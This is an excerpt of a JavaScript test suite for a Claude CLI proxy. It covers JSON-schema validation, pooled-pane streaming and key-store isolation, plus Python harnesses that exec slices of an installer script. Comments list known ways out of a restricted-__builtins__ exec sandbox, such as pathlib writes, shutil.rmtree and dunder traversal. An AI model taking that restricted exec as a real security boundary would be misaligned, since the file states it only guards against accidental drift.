  required: ["steps", "final_answer"],
  additionalProperties: false,
};

test("validateJsonSchema: OpenAI doc schema ($ref/$defs) + strict:true accepts a conforming reply", () => {
  const conforming = { steps: [{ explanation: "add", output: "4" }, { explanation: "done", output: "4" }], final_answer: "4" };
  assert.deepEqual(validateJsonSchema(conforming, OPENAI_DOC_SCHEMA, "$", true), []);
});

test("validateJsonSchema: $ref + strict:true still REJECTS a genuinely-extra key (fix didn't disable validation)", () => {
  const extra = { steps: [{ explanation: "add", output: "4", bogus: 1 }], final_answer: "4" };
  const errs = validateJsonSchema(extra, OPENAI_DOC_SCHEMA, "$", true);
  assert.ok(errs.some(e => /bogus.*additional property not allowed/.test(e)), `expected the extra key rejected, got: ${JSON.stringify(errs)}`);
});

test("validateJsonSchema: $ref + strict:true still catches a missing required property", () => {
  const missing = { steps: [{ explanation: "add" }], final_answer: "4" };
  assert.ok(validateJsonSchema(missing, OPENAI_DOC_SCHEMA, "$", true).some(e => /output.*required/.test(e)));
});

test("validateJsonSchema: anyOf accepts a value matching one branch, rejects a value matching none", () => {
  const schema = { anyOf: [{ type: "string" }, { type: "integer" }] };
  assert.deepEqual(validateJsonSchema("hi", schema), []);
  assert.deepEqual(validateJsonSchema(3, schema), []);
  assert.ok(validateJsonSchema(true, schema).length > 0);
});

test("validateJsonSchema: allOf requires every branch to pass", () => {
  const schema = { allOf: [{ type: "object", properties: { a: { type: "integer" } }, required: ["a"] }, { type: "object", properties: { b: { type: "string" } }, required: ["b"] }] };
  assert.deepEqual(validateJsonSchema({ a: 1, b: "x" }, schema), []);
  assert.ok(validateJsonSchema({ a: 1 }, schema).some(e => /b.*required/.test(e)));
});

test("validateJsonSchema: unresolvable $ref is skipped, not failed", () => {
  assert.deepEqual(validateJsonSchema({ anything: 1 }, { $ref: "#/$defs/missing" }), []);
});

// ── PR #153 review round 2, BLOCKER: cyclic $ref must fail closed, not stack-overflow ──
// A pure ref→ref cycle recurses independent of the data — before the fix ANY reply value (even `5`)
// threw `RangeError: Maximum call stack size exceeded`, caught upstream as a 500 but only after
// 1–3 metered spawns → a request-controlled cost-amplification / grief vector on an authed path.
test("validateJsonSchema: a→b→a cyclic $ref fails closed (no stack overflow) for any value", () => {
  const schema = { $defs: { a: { $ref: "#/$defs/b" }, b: { $ref: "#/$defs/a" } }, $ref: "#/$defs/a" };
  let errs;
  assert.doesNotThrow(() => { errs = validateJsonSchema(5, schema, "$", true); }, "cyclic $ref must not overflow the stack");
  assert.ok(errs.some(e => /cyclic \$ref/.test(e)), `expected a cyclic-$ref error, got: ${JSON.stringify(errs)}`);
});
test("validateJsonSchema: self-referential $ref (a→a) fails closed", () => {
  const schema = { $defs: { a: { $ref: "#/$defs/a" } }, $ref: "#/$defs/a" };
  let errs;
  assert.doesNotThrow(() => { errs = validateJsonSchema({ x: 1 }, schema, "$", true); });
  assert.ok(errs.some(e => /cyclic \$ref/.test(e)));
});
test("validateJsonSchema: cycle routed through anyOf fails closed", () => {
  const schema = { $defs: { a: { anyOf: [{ $ref: "#/$defs/a" }] } }, $ref: "#/$defs/a" };
  assert.doesNotThrow(() => validateJsonSchema({ x: 1 }, schema, "$", true));
});
test("validateJsonSchema: a LEGITIMATE recursive schema (Node→child:Node) is NOT flagged as a cycle", () => {
  // Data is a finite tree, so data-consuming recursion terminates — the cycle guard must not
  // false-positive here (refChain resets across properties/items).
  const schema = {
    $defs: { node: { type: "object", properties: { v: { type: "integer" }, child: { $ref: "#/$defs/node" } }, required: ["v"], additionalProperties: false } },
    $ref: "#/$defs/node",
  };
  const tree = { v: 1, child: { v: 2, child: { v: 3 } } };
  assert.deepEqual(validateJsonSchema(tree, schema, "$", true), []);
});

// ── PR #153 review finding 2: never serve an unvalidated / ambiguous extraction ──
test("extractJsonPayload: json_object mode rejects a refusal that merely CONTAINS json", () => {
  const reply = 'I can\'t do that. For reference the schema looks like {"type":"object"} — sorry.';
  const r = extractJsonPayload(reply, { whole: true });
  assert.equal(r.ok, false);
});

test("extractJsonPayload: json_object mode accepts a whole-reply JSON value", () => {
  const r = extractJsonPayload('  {"temp":21}  ', { whole: true });
  assert.ok(r.ok); assert.deepEqual(r.value, { temp: 21 });
});

test("extractJsonPayload: schema mode rejects >1 top-level JSON value (Schema:{} Answer:{})", () => {
  const reply = 'Schema: {"type":"object"}\n\nAnswer: {"temp":21}';
  const r = extractJsonPayload(reply);
  assert.equal(r.ok, false);
  assert.ok(/more than one/.test(r.reason || ""));
});

test("extractJsonPayload: schema mode rejects two competing options rather than silently picking one", () => {
  const r = extractJsonPayload('Option A:\n{"a":1}\nOption B:\n{"b":2}');
  assert.equal(r.ok, false);
});

test("extractJsonPayload: single prose-wrapped value still accepted in schema mode", () => {
  const r = extractJsonPayload('Sure, here you go: {"a":1} — done.');
  assert.ok(r.ok); assert.deepEqual(r.value, { a: 1 });
});

// ── Cleanup ──
// Settle the async-bodied tests registered through the sync `test()` helper BEFORE summarizing —
// otherwise their pass/fail is not reflected in the counts (see the `pendingAsync` comment above).
// ─── TUI streaming × warm pool: the INTEGRATION seam (backlog #2 rebased onto #158) ───
//
// The hook is installed by bootTuiPane at BOOT, and runTuiTurn reads the sink off the PANE
// (pane.streamFile). That indirection is the entire reason a POOLED pane streams: the pool
// pre-boots panes long before a request exists, so anything derived at turn time would leave
// every pool HIT silently buffered while every MISS streamed — a perf regression with no
// failing test and no error, visible only as "streaming mysteriously does nothing in prod".
// These three guard that seam.
console.log("\nTUI streaming × warm pane pool integration:");

import { bootTuiPane as bootPaneUnderTest, runTuiTurn as runTurnUnderTest } from "./lib/tui/session.mjs";
import { mkdtempSync as mkdtemp2, writeFileSync as writeFile2, mkdirSync as mkdir2, readFileSync as readFile2 } from "node:fs";
import { tmpdir as tmpdir2 } from "node:os";

// Fake tmux that records the spawned pane command and always looks ready + pasted.
function makeTmuxRecorder() {
  const cmds = [];
  const tmux = (args) => {
    cmds.push(args);
    if (args[0] === "capture-pane") {
      // input bar present AND the prompt visibly landed → both polls pass immediately
      return { status: 0, stdout: "[Pasted text #1 +2 lines]\n ? for shortcuts" };
    }
    return { status: 0, stdout: "" };
  };
  return { tmux, cmds, paneCmd: () => (cmds.find((a) => a[0] === "new-session") || []).slice(-1)[0] || "" };
}

// A HOME with one already-terminal transcript for `sid`, so readTuiTranscript returns at once.
function seedTranscript(home, sid, text) {
  const dir = `${home}/.claude/projects/x`;
  mkdir2(dir, { recursive: true });
  writeFile2(`${dir}/${sid}.jsonl`, JSON.stringify({
    type: "assistant",
    message: { role: "assistant", content: [{ type: "text", text }], stop_reason: "end_turn" },
    turn_duration: 1234, cc_entrypoint: "cli",
  }) + "\n");
}

test("bootTuiPane with a streamDir installs the hook AT BOOT and hands the sink back on the pane", async () => {
  const home = mkdtemp2(`${tmpdir2()}/ocp-t-`);
  const streamDir = mkdtemp2(`${tmpdir2()}/ocp-s-`);
  const rec = makeTmuxRecorder();
  const pane = await bootPaneUnderTest({
    model: "sonnet", claudeBin: "claude", home, realHome: home,
    cwd: `${home}/wk`, port: 3456, tmux: rec.tmux, streamDir,
  });
  // The pane carries its OWN sink, named from its OWN session-id — which is what a pre-booted
  // pool pane needs, since it is minted with no knowledge of the request it will eventually serve.
  assert.ok(pane.streamFile, "a streamDir must yield a per-pane sink on the returned pane");
  assert.ok(pane.streamFile.includes(pane.sessionId), "the sink is keyed by the pane's own session-id");
  const cmd = rec.paneCmd();
  assert.ok(cmd.includes("OCP_TUI_STREAM_FILE="), "the pane's env must carry its sink path");
  assert.ok(cmd.includes(pane.streamFile), "…and it must be THIS pane's sink, not a shared one");
  assert.ok(cmd.includes("--settings"), "the MessageDisplay hook must be registered at spawn");
});

test("bootTuiPane WITHOUT a streamDir spawns exactly today's pane — no hook, no --settings", async () => {
  const home = mkdtemp2(`${tmpdir2()}/ocp-t-`);
  const rec = makeTmuxRecorder();
  const pane = await bootPaneUnderTest({
    model: "sonnet", claudeBin: "claude", home, realHome: home,
    cwd: `${home}/wk`, port: 3456, tmux: rec.tmux,
  });
  assert.equal(pane.streamFile, null, "no streamDir → no sink (streaming is opt-in, default OFF)");
  const cmd = rec.paneCmd();
  assert.ok(!cmd.includes("--settings"), "the default spawn must not gain --settings");
  assert.ok(!cmd.includes("OCP_TUI_STREAM_FILE"), "the default spawn must not gain the hook env");
});

test("REGRESSION: a WARM (pooled) pane streams — the sink comes off the pane, not the turn", async () => {
  const home = mkdtemp2(`${tmpdir2()}/ocp-t-`);
  const streamDir = mkdtemp2(`${tmpdir2()}/ocp-s-`);
  const rec = makeTmuxRecorder();

  // Pre-boot a pane the way the POOL does (its own session-id + sink, fixed at boot).
  const warm = await bootPaneUnderTest({
    model: "sonnet", claudeBin: "claude", home, realHome: home,
    cwd: `${home}/wk`, port: 3456, tmux: rec.tmux, streamDir,
  });
  // Its hook has already fired twice by the time the turn's transcript goes terminal.
  writeFile2(warm.streamFile,
    JSON.stringify({ hook_event_name: "MessageDisplay", delta: "Hello " }) + "\n" +
    JSON.stringify({ hook_event_name: "MessageDisplay", delta: "world" }) + "\n");
  seedTranscript(home, warm.sessionId, "Hello world");

  const seen = [];
  const pool = { acquire: () => warm, refill: () => {}, warm: 0 };
  const out = await runTurnUnderTest({
    prompt: "say hello", model: "sonnet", claudeBin: "claude", home, realHome: home,
    cwd: `${home}/wk`, port: 3456, tmux: rec.tmux, pool,
    onDelta: (d) => seen.push(d.delta),
    // streamDir is deliberately NOT passed: on a pool HIT runTuiTurn never cold-boots, so if it
    // recomputed the sink from a turn-time streamDir (the pre-rebase shape) this turn would emit
    // ZERO deltas and silently serve buffered. Reading pane.streamFile is what makes it stream.
    streamDir: null,
  });
  assert.deepEqual(seen, ["Hello ", "world"], "the pooled pane's deltas must reach the client");
  assert.equal(out.text, "Hello world", "and the transcript stays authoritative for the final text");
});

console.log("\nTest isolation (the suite must never touch the operator's live key store):");

test("the key store under test is a scratch db, NOT the operator's real ~/.ocp/ocp.db", () => {
  // The guard that was missing. `npm test` wrote live, UNREVOKED api_keys rows straight into the
  // operator's real ~/.ocp/ocp.db — the same database the running server reads — two per run,
  // unbounded (737 junk keys vs 12 real ones on the maintainer's host before this landed). It
  // went unnoticed for so long precisely because NOTHING asserted where the store actually was.
  const real = join(homedir(), ".ocp", "ocp.db");
  const used = getDbPath();
  assert.ok(used, "getDb() must have opened something by now");
  assert.notEqual(used, real, "the suite must NOT open the operator's live key database");
  assert.ok(used.startsWith(TEST_OCP_DIR), `expected a scratch db under ${TEST_OCP_DIR}, got ${used}`);
});

test("a PRODUCTION process (no NODE_ENV) must IGNORE OCP_DIR_OVERRIDE", () => {
  // Must run OUT OF PROCESS. The parent is irreversibly NODE_ENV=test by the time any test runs
  // (test-env.mjs set it before keys.mjs was imported), so the production path is unreachable
  // from in here — and an in-process test can only ever RE-IMPLEMENT the predicate, which is
  // worthless: the first cut of this test did exactly that, and deleting the whole NODE_ENV gate
  // from keys.mjs still left the suite at 320 passed / 0 failed. A copy of the predicate is not
  // the predicate. So: spawn a child with no NODE_ENV, the override set, and HOME redirected to
  // a temp dir (so the real key store is never opened), and assert what the REAL keys.mjs did.
  const home = mkdtempSync(join(tmpdir(), "ocp-prodsim-"));
  const evil = mkdtempSync(join(tmpdir(), "ocp-evil-"));
  try {
    const keysUrl = pathToFileURL(join(import.meta.dirname, "keys.mjs")).href;
    // The child prints the override it SAW, then the store it actually opened. Printing both is
    // the negative control: without it, a future refactor that renamed the env var and missed
    // this test's `env` object would leave the child with no override at all — and "prod opened
    // the right store" would pass for the wrong reason. Asserting the child saw it and ignored
    // it anyway is the claim we actually want to make.
    const probe = `import { getDb, getDbPath, closeDb } from ${JSON.stringify(keysUrl)};
getDb(); process.stdout.write(process.env.OCP_DIR_OVERRIDE + "\\n" + getDbPath()); closeDb();`;
    const env = { ...process.env, HOME: home, OCP_DIR_OVERRIDE: evil };
    delete env.NODE_ENV;                       // a production server has no NODE_ENV
    const [seen, opened] = execFileSync(process.execPath, ["--input-type=module", "-e", probe],
      { env, encoding: "utf8" }).trim().split("\n");
    assert.equal(seen, evil, "precondition: the child must actually SEE the override");
    assert.equal(opened, join(home, ".ocp", "ocp.db"), "a prod process must open HOME/.ocp/ocp.db");
    assert.ok(!opened.startsWith(evil), "…having seen the override, a prod process must IGNORE it");
  } finally {
    rmSync(home, { recursive: true, force: true });
    rmSync(evil, { recursive: true, force: true });
  }
});

test("listKeys does not depend on rows left behind by an earlier or concurrent run", () => {
  // The ~1-in-6 flake: two runs sharing one db file. keys.find() returned undefined and the
  // caller's `in` check threw a TypeError instead of failing cleanly. With a per-run scratch db
  // the store starts empty, so the count is exactly what THIS run created.
  const mine = listKeys().filter((k) => k.name === "test-user-1");
  assert.equal(mine.length, 1, "exactly one test-user-1 — a shared store would accumulate duplicates");
});

// ═════════════════════════════════════════════════════════════════════════════
// ── ocp-connect model-registry coverage (issue #210) ─────────────────────────
// ═════════════════════════════════════════════════════════════════════════════
// `ocp-connect` is a user-facing installer that writes model metadata straight into the
// user's OpenClaw registry (~/.openclaw/openclaw.json). Before this PR, `test-features.mjs`
// mentioned `ocp-connect` exactly once (`grep -c 'ocp-connect' test-features.mjs` -> `1`) — a
// comment noting it as a maxTokens consumer, not a test — and exercised none of its logic. Two
// real defects shipped in exactly this uncovered surface and were caught only by human review
// during #208's review: the unknown-id fallback over-advertised by 4x (8192 -> 32000), and a
// comment describing the family maxTokens table misdescribed its own scope. Meanwhile the
// equivalent claim on the models.json side of the same feature IS pinned and mutation-verified
// (`_spotRegistryMaxTokens` above, #195/#208). This section brings ocp-connect's classifier up
// to the same bar.
//
// Harness (verified during #208's review, see #210): the REAL `model_meta` table and REAL
// `get_model_meta()` function are sliced out of ocp-connect's own source verbatim — between two
// textual anchors — and exec'd in a fresh python namespace, in a child `python3` process.
// Nothing here is a JS re-implementation ("replica") of the classifier: a change to
// ocp-connect's table, its prefix-matching order, or its fallback is a change to what this
// harness EXECUTES, not merely what it reads. A test that grepped ocp-connect's source text for
// an expected number would not do that — it would pin whatever string is on the page today,
// including a wrong one, and miss any regression that changes the computed VALUE without
// changing the literal text near it.
//
// Scope, precisely: covers the classifier (`model_meta` + `get_model_meta()`) AND the loop that
// maps its output into `provider.models` entries (still pure in-memory — no file I/O). It does
// NOT cover: the JSON config load/merge/write that follows, per-agent auth-profile seeding, or
// any network/install path (connectivity probing, shell-rc rewriting, launchctl/systemd env
// writes) — those are out of scope per #210 and untouched here. (#218 review MED-3: an earlier
// draft of this section claimed to cover "the model metadata ocp-connect hands OpenClaw" without
// actually reaching the mapping loop — narrowed here, and the mapping loop is now covered by a
// dedicated test below instead of just a narrower claim.)
console.log("\nocp-connect model registry (#210):");

const _ocConnectPath = spotJoin(_spotDir, "ocp-connect");

// Every python harness below slices ocp-connect's source between two textual anchors and execs
// the slice. Four failure modes were found across three rounds of #218 review:
//   - MED-1a: an anchor that fails to match makes `.index()` throw — loud, fine. But if the
//     START and END anchors are found in the WRONG order (or the slice is otherwise degenerate),
//     python slicing silently returns `''`, and `py_compile`/`exec` on an empty string trivially
//     "succeeds" — a vacuous pass, not a check. Guarded in every harness below: each asserts its
//     slice is non-empty and contains what it must contain before doing anything with it.
//   - MED-1b: `.index(marker)` (no bound) matches the FIRST occurrence of `marker` in the whole
//     file. If unrelated code elsewhere in ocp-connect ever introduces an earlier occurrence of
//     the same text, the slice silently grows or shifts. Concretely: `for mid in model_ids:`
//     appears twice in ocp-connect (the classify loop, and the alias-building loop 49 lines
//     later); renaming the FIRST one makes the (unbounded) end-anchor search land on the SECOND,
//     and the slice silently grows to include code that was never meant to be in it. Guarded in
//     every harness below by a narrow assertion naming the SPECIFIC adjacent-section markers
//     each slice must never contain (`os.makedirs` / `open(config_path` / `provider = {`,
//     depending on which section is adjacent) — this is a slice-CORRECTNESS check, distinct from
//     the file-I/O concern below, and stays a substring check because false positives here are
//     rare (these are long, specific strings unlikely to appear by coincidence) and a hit is
//     genuinely informative (it means the slice boundary moved).
//   - round-2 MED-1: `_OC_PROVIDER_PY` — the harness ending closest to ocp-connect's real config
//     writer, right before `if os.path.exists(config_path)` — had NO 1b-style guard at all,
//     unlike its siblings. What stopped it from actually running that writer was `config_path`
//     being undefined (a NameError), not a guard: ordering luck. Demonstrated by mutation-proof:
//     inserting `os.makedirs(...)` + `open(..., "w")` between the write loop and that line made
//     `npm test` actually create a directory and write a file, all green.
//   - round-3 MED-1: the round-2 fix — copy the 1b-style two-marker check into `_OC_PROVIDER_PY`,
//     then (when THAT was shown bypassable by `open("<arbitrary path>", "w")`, containing
//     neither marker) broaden it to a blanket `'open(' not in blk and 'os.' not in blk` in every
//     harness — was ALSO bypassed, by `pathlib.Path(...).write_text(...)`, which contains
//     neither substring either and also wrote a real file. Three rounds, one shape: no substring
//     denylist can express "this code cannot touch the filesystem", because that is a property
//     of what the code may DO at runtime, not of what substrings appear in its source text —
//     and a broad enough denylist to catch every I/O idiom (pathlib, shutil, subprocess,
//     `__import__`, tempfile, ...) starts also matching unrelated PROSE: adding "Deliberately
//     does no os.path work." to a docstring inside the slice broke 7 unrelated tests (measured).
//     The blanket ban has therefore been REMOVED (not weakened further) in favor of an actual
//     capability boundary: every harness that calls `exec(blk, ns)` now passes an explicit,
//     minimal `ns["__builtins__"]` — Python only auto-injects the real, unrestricted
//     `__builtins__` module when the exec namespace has no `__builtins__` key at all, so
//     supplying our own dict containing ONLY the names the slice actually calls (confirmed
//     sufficient, and confirmed to leave real output byte-for-byte unchanged, by diffing
//     restricted vs. unrestricted execution of the real slice) pre-empts that injection. Bare
//     names not in that dict — `open`, `__import__` (which `import pathlib` etc. compile down
//     to), and everything reachable only through them — raise `NameError`/`ImportError` before a
//     single byte moves. This is a property of the CODE PATH taken at exec time, not of the
//     source text, so it is not defeated by a new I/O idiom nobody has thought of yet, and it
//     cannot be tripped by an unrelated comment either.
//     SCOPE, stated exactly rather than absolutely: this is a DRIFT guard, not an adversarial
//     sandbox. Deliberate dunder traversal still reaches the filesystem — `len.__self__.open(...)`
//     writes a real file (measured), as does `json.__builtins__['open']` in the harness that
//     passes `json` as a namespace key. That is out of scope on purpose: the failure mode this
//     defends against is a slice ACCIDENTALLY growing into ocp-connect's installer section, and
//     all three real bypasses found in review were ordinary edits (`os.makedirs`, a bare
//     `open()`, `pathlib.write_text`), not dunder walks. Nobody writes `len.__self__` by accident
//     in an embedded python block. The standing constraint on this repo is that ocp-connect is
//     never run end-to-end because it writes the user's OpenClaw registry; a harness that can
//     silently begin exec'ing that writer is the one shape that must not exist here, and this
//     closes that — for accidents, which is the whole threat model.

// --- Harness 1: classify one or more model ids through ocp-connect's REAL model_meta table +
// REAL get_model_meta() (verbatim exec — the exact slice given in #210's own harness sketch). ---
const _OC_CLASSIFY_PY = `
import json, sys
src = open(sys.argv[1]).read()
blk = src[src.index('model_meta = {') : src.index('for mid in model_ids:')]
assert blk.strip(), "empty model_meta slice - anchor drift (see #218 review MED-1a)"
assert 'def get_model_meta' in blk, "slice missing get_model_meta - anchor drift"
assert 'os.makedirs' not in blk and 'open(config_path' not in blk, \\
    "slice overgrown past the intended block - anchor drift (see #218 review MED-1b)"
# #218 round-3 review: a substring denylist (round 2's blanket 'open('/'os.' ban, which used to
# be here) is NOT a capability boundary and was DROPPED, not just weakened: it scans the WHOLE
# slice including comments, so a purely cosmetic docstring edit ("Deliberately does no os.path
# work.") broke this test with an unreadable false positive (measured: 7 unrelated tests failed
# from that one-line comment). Worse, it was bypassable anyway - pathlib.Path(...).write_text(
# ...), shutil.rmtree, __import__('os').remove and others contain NEITHER 'open(' NOR 'os.' and
# sailed straight past it, actually writing a file to disk (verified via mutation-proof).
# Restricting __builtins__ to exactly what this block needs (sorted, len - confirmed sufficient
# by diffing real output with/without the restriction) is the actual capability boundary:
# pathlib/shutil/subprocess/__import__/open all NameError or ImportError before a single byte
# moves, because Python only auto-injects the real __builtins__ module when the exec namespace
# has no '__builtins__' key at all - supplying our own dict (with only the names this block
# calls) pre-empts that injection, and it does so on CODE, not on the presence of a string
# anywhere in the slice, so it cannot be fooled by an unrelated comment either way.
ns = {"__builtins__": {"sorted": sorted, "len": len}}
exec(blk, ns)
ids = json.loads(sys.argv[2])
out = {mid: ns['get_model_meta'](mid) for mid in ids}
sys.stdout.write(json.dumps(out))
`;

function _ocClassify(ids) {
  const raw = execFileSync(
    "python3",
    ["-c", _OC_CLASSIFY_PY, _ocConnectPath, JSON.stringify(ids)],
    { encoding: "utf8" },
  );
  return JSON.parse(raw);
}

// --- Harness 2: pull the REAL model_meta table itself (not a classification of a specific id)
// out of ocp-connect, so it can be compared to a pinned snapshot BY EQUALITY (see the
// "matches a pinned snapshot EXACTLY" test below, #218 review HIGH-2). ---
const _OC_TABLE_PY = `
import json, sys
src = open(sys.argv[1]).read()
blk = src[src.index('model_meta = {') : src.index('for mid in model_ids:')]
assert blk.strip(), "empty model_meta slice - anchor drift (see #218 review MED-1a)"
assert 'def get_model_meta' in blk, "slice missing get_model_meta - anchor drift"
assert 'os.makedirs' not in blk and 'open(config_path' not in blk, \\
    "slice overgrown past the intended block - anchor drift (see #218 review MED-1b)"
# #218 round-3 review: a substring denylist (round 2's blanket 'open('/'os.' ban, which used to
# be here) is NOT a capability boundary and was DROPPED, not just weakened: it scans the WHOLE
# slice including comments, so a purely cosmetic docstring edit ("Deliberately does no os.path
# work.") broke this test with an unreadable false positive (measured: 7 unrelated tests failed
# from that one-line comment). Worse, it was bypassable anyway - pathlib.Path(...).write_text(
# ...), shutil.rmtree, __import__('os').remove and others contain NEITHER 'open(' NOR 'os.' and
# sailed straight past it, actually writing a file to disk (verified via mutation-proof).
# Restricting __builtins__ to exactly what this block needs (sorted, len - confirmed sufficient
# by diffing real output with/without the restriction) is the actual capability boundary:
# pathlib/shutil/subprocess/__import__/open all NameError or ImportError before a single byte
# moves, because Python only auto-injects the real __builtins__ module when the exec namespace
# has no '__builtins__' key at all - supplying our own dict (with only the names this block
# calls) pre-empts that injection, and it does so on CODE, not on the presence of a string
# anywhere in the slice, so it cannot be fooled by an unrelated comment either way.
ns = {"__builtins__": {"sorted": sorted, "len": len}}
exec(blk, ns)
sys.stdout.write(json.dumps(ns['model_meta']))
`;

function _ocModelMetaTable() {
  const raw = execFileSync("python3", ["-c", _OC_TABLE_PY, _ocConnectPath], { encoding: "utf8" });
  return JSON.parse(raw);
}

// --- Harness 3: drive the REAL model_meta/get_model_meta block AND the REAL loop that maps
// get_model_meta's output into provider.models entries (the code `_ocClassify` above never
// reaches — #218 review MED-3). Still pure in-memory: the slice stops at "# Load or create
// config", strictly before any file read/write. `provider` is seeded as an empty
// {"models": []} rather than sliced from ocp-connect's own `provider = {...}` (which needs
// `base_url`/`api_key` this harness deliberately doesn't supply) — the loop only ever appends
// to provider["models"], so this is sufficient to observe its output. ---
const _OC_PROVIDER_PY = `
import json, sys
src = open(sys.argv[1]).read()
start_marker = 'model_meta = {'
end_marker = '\\n\\n# Load or create config'
si = src.index(start_marker)
ei = src.index(end_marker, si)
blk = src[si:ei]
assert blk.strip(), "empty slice - anchor drift (see #218 review MED-1a)"
assert 'def get_model_meta' in blk, "slice missing get_model_meta - anchor drift"
assert 'for mid in model_ids' in blk, "slice missing the provider.models write loop - anchor drift"
assert 'os.makedirs' not in blk and 'open(config_path' not in blk, \\
    "slice overgrown past the intended block - anchor drift (see #218 round-2 review MED-1: " \\
    "this harness is the one pushed closest to file I/O, and is the one that must never reach it)"
# #218 round-3 review: even the two-KNOWN-marker denylist above (added in round 2, itself a fix
# for round 1 having NO guard here at all) was shown insufficient by mutation-proof:
# open("<arbitrary path>", "w") contains neither 'os.makedirs' nor 'open(config_path' and wrote
# a real file to disk, 473/0 green. A follow-up blanket 'open('/'os.' ban (still just a
# denylist) was THEN shown insufficient too - pathlib.Path(...).write_text(...) contains
# neither substring and also wrote a real file - AND it scanned comments, so it was DROPPED
# rather than kept (a purely cosmetic docstring edit elsewhere in this slice broke 7 unrelated
# tests with an unreadable false positive; measured). Three rounds, one shape: no substring
# denylist can express "cannot touch the filesystem", because that is a property of what the
# code may DO, not of what it SAYS. Restricting __builtins__ to exactly what this block needs
# (sorted, len - confirmed sufficient by diffing real output with/without the restriction) is
# THE capability boundary that actually matters here, since this is the harness pushed closest
# to ocp-connect's real config writer and the standing constraint on this repo is that
# ocp-connect is never run end-to-end: pathlib/shutil/subprocess/__import__/open all NameError
# or ImportError before a single byte moves, because Python only auto-injects the real
# __builtins__ module when the exec namespace has no '__builtins__' key at all - supplying our
# own dict (with only the two names this block actually calls) pre-empts that injection, on
# CODE rather than on text, so an unrelated comment cannot trip it either way.
ids = json.loads(sys.argv[2])
ns = {"model_ids": ids, "provider": {"models": []}, "__builtins__": {"sorted": sorted, "len": len}}
exec(blk, ns)
sys.stdout.write(json.dumps(ns["provider"]["models"]))
`;

function _ocBuildProviderModels(ids) {
  const raw = execFileSync(
    "python3",
    ["-c", _OC_PROVIDER_PY, _ocConnectPath, JSON.stringify(ids)],
    { encoding: "utf8" },
  );
  return JSON.parse(raw);
}

// --- Harness 4: drive ocp-connect's REAL /v1/models-JSON-parse try/except verbatim, with a
// caller-supplied `models_json_str`, and return the resulting `model_ids`. This is how the
// hardcoded three-id fallback list (used when /v1/models JSON fails to parse) is obtained below
// — by actually running the real except: branch with malformed input, not by reading the
// literal off the page. ---
const _OC_FALLBACK_PY = `
import json, sys
src = open(sys.argv[1]).read()
start_marker = "try:\\n    models_data = json.loads(models_json_str)"
end_marker = "\\n\\n# Build provider entry"
si = src.index(start_marker)
ei = src.index(end_marker, si)
blk = src[si:ei]
assert blk.strip(), "empty fallback slice - anchor drift (see #218 review MED-1a)"
assert 'except:' in blk, "slice missing the except: branch - anchor drift"
assert 'provider = {' not in blk, "slice overgrown past the intended block - anchor drift (see #218 review MED-1b)"
# #218 round-3 review: round 2's blanket 'open('/'os.' ban used to be here — dropped, not kept,
# per the same reasoning as the other harnesses: bypassable (pathlib etc.) AND scans comments
# (a false-positive risk, measured elsewhere in this file). Same capability-boundary fix
# instead. This slice's try/except body needs zero bare builtin calls (json is passed in
# explicitly as a namespace key, not looked up as a builtin), so the restricted __builtins__
# set is empty — confirmed by diffing real output (both the well-formed and malformed-JSON
# branches) with/without it.
ns = {"json": json, "models_json_str": sys.argv[2], "__builtins__": {}}
exec(blk, ns)
sys.stdout.write(json.dumps(ns["model_ids"]))
`;

function _ocFallbackModelIds(modelsJsonStr) {
  const raw = execFileSync(
    "python3",
    ["-c", _OC_FALLBACK_PY, _ocConnectPath, modelsJsonStr],
    { encoding: "utf8" },
  );
  return JSON.parse(raw);
}

// Registry ground truth for ids ocp-connect's classifier might be handed but that are NOT in
// models.json (so absent from `_spotRegistryMaxTokens` above). Manually pinned from the CLI
// 2.1.220 binary, id-anchored:
//   grep -ao 'id:"<id>".\{0,700\}' <binary> | grep -o 'max_output_tokens:{default:[0-9]*'
// (a 400-byte window silently truncates before reaching max_output_tokens for these particular
// records — different window widths give different results, per the #210 extraction protocol;
// 700 bytes was confirmed sufficient for every id below). All three are opus-family ids the CLI
// registry caps at 32000 that ocp-connect's 64000 opus row would over-advertise 2x; ocp-connect's
// own comment names only two of them (-4-0/-4-5) — claude-opus-4-1 is the same defect class and
// was missing from that comment (#218 review MED-6: re-verified id-anchored, added here).
//
// On the CURRENT tree none of these three are actually reached by any passing assertion — the
// hardcoded fallback list below resolves entirely via `_spotRegistryMaxTokens`/`legacyAliases`
// — so this map's only current reader is the mutation-proof for the "hardcoded three-id ...
// fallback" test (swap an id into that list and this is what gives the swapped-in id's ground
// truth). It earns its place by making that test's coverage provable beyond models.json's own
// members, not by being exercised on every green run (#218 review MED-5).
const _ocKnownRegistryExtras = {
  "claude-opus-4-0": 32000,
  "claude-opus-4-1": 32000,
  "claude-opus-4-5": 32000,
};

// Resolve the registry ground truth for an id ocp-connect might classify: directly (a
// models.json id), via models.json's legacyAliases/aliases (e.g. the hardcoded fallback's bare
// "claude-haiku-4" -> "claude-haiku-4-5-20251001"), or via the manually-pinned extras above.
function _ocRegistryTruth(id) {
  if (id in _spotRegistryMaxTokens) return _spotRegistryMaxTokens[id];
  const viaLegacy = (_spotModels.legacyAliases || {})[id];
  if (viaLegacy && viaLegacy in _spotRegistryMaxTokens) return _spotRegistryMaxTokens[viaLegacy];
  const viaAlias = (_spotModels.aliases || {})[id];
  if (viaAlias && viaAlias in _spotRegistryMaxTokens) return _spotRegistryMaxTokens[viaAlias];
  if (id in _ocKnownRegistryExtras) return _ocKnownRegistryExtras[id];
  return undefined;
}

// #218 review HIGH-1: every harness above assumes bash hands python ocp-connect's python-block
// source TEXT byte-for-byte — true only because the heredoc delimiter is QUOTED (<<'PYEOF').
// An UNQUOTED heredoc (<<PYEOF) makes bash shell-expand $vars / $(...) / `...` in the body
// BEFORE python ever sees it, so the running program would silently differ from the text this
// harness reads — invisibly to every other test in this section. This is the test that actually
// checks the premise the rest of the section depends on.
test("ocp-connect: the model-metadata heredoc is QUOTED (<<'PYEOF') — the harness's fidelity premise", () => {
  const ocSrc = spotReadFileSync(_ocConnectPath, "utf8");
  // Anchor on the FULL opener line, not the bare `<<'PYEOF'` token: ocp-connect has a SECOND,
  // unrelated heredoc later in the file (the shell-rc rewriter) that is ALSO `<<'PYEOF'`-quoted,
  // so a bare substring check would stay true even if THIS heredoc — the one that actually feeds
  // the model_meta/get_model_meta block every other test in this section reads — got unquoted.
  // (Caught in review of this very test: mutating just this line to `<<PYEOF` left the naive
  // `ocSrc.includes("<<'PYEOF'")` check trivially true because of that second heredoc.)
  const openerLine =
    'python3 - "$oc_config" "$base_url" "$key" "$provider_name" "$priority_choice" "$models_out" <<\'PYEOF\' && py_ok=1';
  assert.ok(ocSrc.includes(openerLine),
